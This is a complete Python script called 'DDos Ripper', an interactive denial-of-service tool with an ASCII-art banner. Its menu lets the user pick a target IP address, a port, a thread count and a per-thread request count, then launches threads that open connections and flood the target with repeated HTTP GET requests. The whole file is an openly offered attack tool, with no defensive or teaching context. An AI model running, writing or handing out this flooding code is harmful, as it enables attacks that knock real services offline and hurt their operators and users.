print("\033[31m" + r"""
                        @         @
                         @         @
                     @   @         @   @
                     @  @@         @@  @
                     @@ @@@       @@@ @@
             @      @@   @@@     @@@   @@      @
            @@      @@   @@@     @@@   @@      @@
           @@      @@    @@@@   @@@@    @@      @@
           @@     @@@    @@@@  @@@@@    @@@     @@@
       @  @@@    @@@@    @@@@   @@@@    @@@@   @@@@  @
       @@ @@@@@  @@@@   @@@@@   @@@@@   @@@@  @@@@@ @@
       @@ @@@@@  @@@@@@@@@@@     @@@@@@@@@@@  @@@@@ @@
       @@ @@@@@  @@@@@@@@@@@     @@@@@@@@@@@  @@@@@ @@
      @@@  @@@@   @@@@@@@@@@@@@@@@@@@@@@@@@   @@@@  @@@
     @@@@  @@@@   @@@@@@@@@@@@@@@@@@@@@@@@@   @@@@  @@@@
    @@@@   @@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@   @@@@
   @@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@
   @@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     @@@@@           @@@@@@@@@@@@@@@@@@@           @@@@@
     @@@@@@             @@@@@@@@@@@@@             @@@@@@
      @@@@@@@        ..     @@@@@@@@@     ..        @@@@@@
       @@@@@@@@             @@@@@             @@@@@@@@
        @@@@@@@@@@           @@@           @@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
              @@@@@@@@@@@@@@@   @@@@@@@@@@@@@@@
                  @@@@@@@@@@     @@@@@@@@@@
                   @@@@@@@@       @@@@@@@@
                  @@@@@@@@@       @@@@@@@@@
                  @@@@@@@@@ @@@@@ @@@@@@@@@
                 @@@@@@@@@@@@@@@@@@@@@@@@@@@
                 @@@  @@@@@@@@@@@@@@@@@  @@@
                  @@  @@@@  @@@@@  @@@@  @@
                      @@@@  @@@@@  @@@@
""" + "\033[0m")

import socket
import threading
import sys

def attack(target_ip, target_port, turbo, quiet):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        message = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode('utf-8')
        for _ in range(turbo):
            sock.send(message)
        if not quiet:
            print(f"Attack sent to {target_ip}:{target_port}")
    except Exception as e:
        if not quiet:
            print(f"Failed to attack {target_ip}:{target_port} — {e}")
    finally:
        if sock:
            sock.close()

def main_menu():
    target_ip = ""
    target_port = 80
    turbo = 135
    threads_num = 10
    quiet = False

    try:
        while True:
            print("\n--- DDos Ripper Menu ---")
            print(f"1. Set target IP (current: {target_ip})")
            print(f"2. Set target port (current: {target_port})")
            print(f"3. Set turbo (number of requests per thread) (current: {turbo})")
            print(f"4. Set number of threads (current: {threads_num})")
            print(f"5. Toggle quiet mode (current: {'ON' if quiet else 'OFF'})")
            print("6. Start attack")
            print("7. Exit")

            choice = input("Choose an option (1-7): ")

            if choice == "1":
                target_ip = input("Enter target IP: ").strip()
            elif choice == "2":
                try:
                    target_port = int(input("Enter target port: ").strip())
                except ValueError:
                    print("Invalid port number!")
            elif choice == "3":
                try:
                    turbo = int(input("Enter turbo (number of requests per thread): ").strip())
                except ValueError:
                    print("Invalid number!")
            elif choice == "4":
                try:
                    threads_num = int(input("Enter number of threads: ").strip())
                except ValueError:
                    print("Invalid number!")
            elif choice == "5":
                quiet = not quiet
                print(f"Quiet mode set to {'ON' if quiet else 'OFF'}.")
            elif choice == "6":
                if target_ip == "":
                    print("Target IP is not set!")
                    continue

                print(f"Starting attack on {target_ip}:{target_port} with turbo {turbo} and {threads_num} threads...")
                threads = []
                for _ in range(threads_num):
                    t = threading.Thread(target=attack, args=(target_ip, target_port, turbo, quiet), daemon=True)
                    t.start()
                    threads.append(t)

                for t in threads:
                    t.join()

                print("Attack completed.")
            elif choice == "7":
                print("Exiting.")
                sys.exit()
            else:
                print("Invalid option. Try again.")
    except KeyboardInterrupt:
        print("\nProgram interrupted by user. Exiting.")

if __name__ == "__main__":
    main_menu()
